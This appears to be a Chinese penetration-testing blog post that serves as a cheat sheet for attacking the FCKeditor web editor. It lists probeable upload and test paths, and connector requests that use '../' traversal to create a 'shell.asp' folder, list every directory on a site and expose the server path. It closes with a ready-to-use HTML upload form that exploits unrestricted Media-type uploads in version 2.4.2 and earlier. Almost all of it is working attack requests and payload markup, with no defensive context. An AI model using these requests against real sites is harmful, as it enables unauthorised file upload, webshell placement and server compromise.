-<h5 id="FCKeditor-中test-文件的上传地址"><a href="#FCKeditor-中test-文件的上传地址" class="headerlink" title="FCKeditor 中test 文件的上传地址"></a>FCKeditor 中test 文件的上传地址</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FCKeditor/editor/filemanager/browser/default/connectors/test.html</div><div class="line">FCKeditor/editor/filemanager/upload/test.html</div><div class="line">FCKeditor/editor/filemanager/connectors/test.html</div><div class="line">FCKeditor/editor/filemanager/connectors/uploadtest.html</div></pre></td></tr></table></figure>
-<h5 id="常用上传地址"><a href="#常用上传地址" class="headerlink" title="常用上传地址"></a>常用上传地址</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</div><div class="line">FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</div></pre></td></tr></table></figure>
-<h5 id="JSP-版："><a href="#JSP-版：" class="headerlink" title="JSP 版："></a>JSP 版：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp</div></pre></td></tr></table></figure>
-<h5 id="samples-目录"><a href="#samples-目录" class="headerlink" title="_samples 目录"></a>_samples 目录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">FCKeditor/_samples/default.html</div><div class="line">FCKeditor/_samples/asp/sample01.asp</div><div class="line">FCKeditor/_samples/asp/sample02.asp</div><div class="line">FCKeditor/_samples/asp/sample03.asp</div><div class="line">FCKeditor/_samples/asp/sample04.asp</div></pre></td></tr></table></figure>
-<h2 id="版本2-4-1"><a href="#版本2-4-1" class="headerlink" title="版本2.4.1"></a>版本2.4.1</h2><h5 id="修改CurrentFolder-参数使用-来进入不同的目录"><a href="#修改CurrentFolder-参数使用-来进入不同的目录" class="headerlink" title="修改CurrentFolder 参数使用 ../../来进入不同的目录"></a>修改CurrentFolder 参数使用 ../../来进入不同的目录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../..%2F&amp;NewFolderName=shell.asp</div></pre></td></tr></table></figure>
-<h5 id="根据返回的XML-信息可以查看网站所有的目录。"><a href="#根据返回的XML-信息可以查看网站所有的目录。" class="headerlink" title="根据返回的XML 信息可以查看网站所有的目录。"></a>根据返回的XML 信息可以查看网站所有的目录。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F</div></pre></td></tr></table></figure>
-<h5 id="JSP-版本："><a href="#JSP-版本：" class="headerlink" title="JSP 版本："></a>JSP 版本：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2F</div></pre></td></tr></table></figure>
-<h5 id="爆路径漏洞"><a href="#爆路径漏洞" class="headerlink" title="爆路径漏洞"></a>爆路径漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/shell.asp</div></pre></td></tr></table></figure>
-<h5 id="版本小于等于2-4-2-For-php"><a href="#版本小于等于2-4-2-For-php" class="headerlink" title="版本小于等于2.4.2 For php"></a>版本小于等于2.4.2 For php</h5><p>在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot;</div><div class="line">action=&quot;http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; method=&quot;post&quot;&gt;Upload a new file:&lt;br&gt;</div><div class="line">&lt;input type=&quot;file&quot; name=&quot;NewFile&quot; size=&quot;50&quot;&gt;&lt;br&gt;</div><div class="line">&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/Web渗透/">Web渗透</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
     </div>
 
       
